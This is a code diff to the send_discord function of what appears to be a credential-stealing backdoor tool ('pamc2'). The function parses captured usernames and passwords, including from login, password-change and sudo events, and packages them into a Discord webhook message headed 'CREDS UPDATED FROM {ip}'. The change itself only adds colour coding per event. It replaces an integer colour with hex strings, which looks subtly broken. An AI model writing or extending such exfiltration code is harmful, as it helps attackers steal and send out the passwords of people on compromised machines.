@@ -22,6 +22,7 @@ def send_discord(addr, data):
     password = data.split("-")[1].split(":")[2].strip()
 
     fields = []
+    color = "#000000"
     if (message == "USER AUTHENTICATED" or message == "USER CHANGED PASSWORD"):
         fields.append({
             'name': "Username",
@@ -39,6 +40,13 @@ def send_discord(addr, data):
             'value': f"{username}"
         })
 
+    if (message == "SUDO SESSION OPENED"):
+        color = "#07fc03"
+    elif (message == "USER CHANGED PASSWORD"):
+        color = "#1780e8"
+    elif (message == "USER AUTHENTICATED"):
+        color = "#f5f50a"
+
     hook_data = {
         'content': data,
         'username': 'pamc2 bot (type shit)',
@@ -46,7 +54,7 @@ def send_discord(addr, data):
         'embeds': [{
             'description': f"**CREDS UPDATED FROM {ip}**",
             'fields': fields,
-            'color': 15258703
+            'color': color
         }]
     }
 
